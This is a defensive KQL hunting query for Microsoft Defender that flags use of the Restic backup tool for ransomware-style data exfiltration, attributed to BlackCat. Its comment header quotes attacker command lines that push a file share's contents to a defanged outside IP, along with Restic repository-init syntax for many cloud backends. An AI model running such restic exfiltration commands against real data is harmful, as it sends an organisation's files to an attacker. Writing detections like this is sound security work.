//Title: Detect the Use of Restic for Backup Repository Initiation and Data Exfiltration.
//Description:
// Restic is an open-source backup tool that supports backing up data to various storage types, including local directories, SFTP servers, and cloud services like Amazon S3, Google Cloud Storage, and Microsoft Azure. Recently, it has been observed in use by the BlackCat Ransomware group.
// APTs: BlackCat Ransomware
//Comment: A true positive would involve the following:
//-> restic.exe -r rest:http://195.123.226[.]84:8000/ init --password-file ppp.txt
//-> restic.exe -r rest:http://195.123.226[.]84:8000/ --password-file ppp.txt --use-fs-snapshot --verbose backup "F:\Shares\<REDACTED>\<REDACTED>"
//-> Preparing a new repository CommandLine activity using restic
//-> Local: restic init --repo /srv/restic-repo
//-> SFTP: restic -r sftp:user@host:/srv/restic-repo init
//-> REST Server: restic -r rest:http://host:8000/ init
//-> Amazon S3: restic -r s3:s3.us-east-1.amazonaws.com/bucket_name init
//-> Minio Server: restic -r s3:http://localhost:9000/restic init
//-> OpenStack Swift: restic -r swift:container_name:/path init
//-> Wasabi: restic -o s3.bucket-lookup=dns -o s3.region=<OSS-REGION> -r s3:https://<OSS-ENDPOINT>/<OSS-BUCKET-NAME> init
//-> Backblaze B2: restic -r b2:bucketname:path/to/repo init
//-> Microsoft Azure Blob Storage: restic -r azure:foo:/ init
//-> Google Cloud Storage: restic -r gs:foo:/ init
//-> rclone: restic -r rclone:foo:bar init
//
//Backing up CommandLine activity using restic:
//-> restic -r /srv/restic-repo --verbose backup ~/work
//References:
//   - https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/#exfiltration
//   - https://restic.net/
//
//QKL Advanced hunting query:
let timeframe = 24hr;
// Detection 1: Traffic related to Restic API HTTP header request
let Restic_API_HTTPRequest = (
    DeviceNetworkEvents
    | where Timestamp >= ago(timeframe)
    | where ActionType == "HttpConnectionInspected"
    | extend AdditionalFields_info = parse_json(AdditionalFields)
    | where  AdditionalFields_info.uri in ("application/vnd.x.restic.rest.v1", "application/vnd.x.restic.rest.v2")
          or AdditionalFields_info.user_agent contains "restic"
);
// Detection 2: Process commands events related to Restic tool that could be used to initiate the backup repository and exfiltration
let Restic_ProcessCommandsEvents = (
    DeviceProcessEvents
    | where Timestamp >= ago(timeframe)
    | where ((ProcessCommandLine has_all (" -r", " :/", " init") or ProcessCommandLine has_all (" --repo", ":/", " init"))
     or ProcessCommandLine has_any (" backup", " init")
     and (   (ProcessCommandLine has_all (" -r", " sftp:"))
           or(ProcessCommandLine has_all (" -r", " rest:http"))
           or(ProcessCommandLine has_all (" -r", " s3:s3.", "amazonaws"))
           or(ProcessCommandLine has_all (" -r", " s3:http"))
           or(ProcessCommandLine has_all (" -r", " swift:"))
           or(ProcessCommandLine has_all (" -r", " b2:"))
           or(ProcessCommandLine has_all (" -r", " azure:"))
           or(ProcessCommandLine has_all (" -r", " gs:"))
           or(ProcessCommandLine has_all (" -r", " gs:"))
           or(ProcessCommandLine has_all (" -r", " rclone:"))
)));
// Combine all detections
let Suspicious_Restic_data_Exfiltration_Activities = (
    union Restic_API_HTTPRequest, Restic_ProcessCommandsEvents
    | summarize arg_max(Timestamp, *) by DeviceId
    | order by Timestamp asc
);Suspicious_Restic_data_Exfiltration_Activities